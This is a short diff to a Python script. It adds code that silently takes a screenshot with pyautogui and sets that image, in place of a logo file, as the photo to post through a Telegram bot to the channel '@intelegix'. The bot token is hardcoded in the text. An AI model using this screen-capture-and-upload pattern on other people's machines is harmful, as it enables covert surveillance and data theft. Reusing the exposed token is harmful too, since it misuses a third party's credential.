@@ -1,8 +1,11 @@
 import requests
+import pyautogui
+
+pyautogui.screenshot(r"screenshot1.png")
 
 token = "1362521589:AAETxO9b_8NLgVpCVe4yD4I5q9U2SwPeYbw"
 chat_id = '@intelegix'  # chat id
-file = 'logo.png'
+file = 'screenshot1.png'
 
 url = f"https://api.telegram.org/bot{token}/sendPhoto"
 
